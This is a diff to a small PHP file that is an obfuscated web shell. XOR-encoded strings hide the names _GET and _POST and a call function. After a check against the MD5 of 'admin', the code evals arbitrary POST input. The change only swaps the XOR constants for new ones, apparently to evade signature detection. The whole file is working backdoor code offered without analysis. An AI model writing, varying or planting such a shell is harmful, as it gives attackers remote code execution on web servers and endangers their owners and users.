@@ -1,13 +1,13 @@
 
 <?php
-$a = ${"j{*$"^"5<op"}[1];
-$b = ${"d<)}<"^";lf.h"}[2];
+$a = ${"g }$"^"8g8p"}[1];
+$b = ${"c)+ }"^"<yds)"}[2];
 //  1 is md5('admin'). You can have on your own.
 if(isset($b) and md5($a)=='21232f297a57a5a743894a0e4a801fc3')
 {
 
 	class C{public function __invoke($p) {eval($p);}};
-	$t = ".&%\\k?^:(d[):<"^"MGI04J-_Z;=\\T_";
+	$t = "(!>?a($>^h@/>+"^"K@RS>]W[,7&ZPH";
     @${'t'}(new C(),$b);
   
   
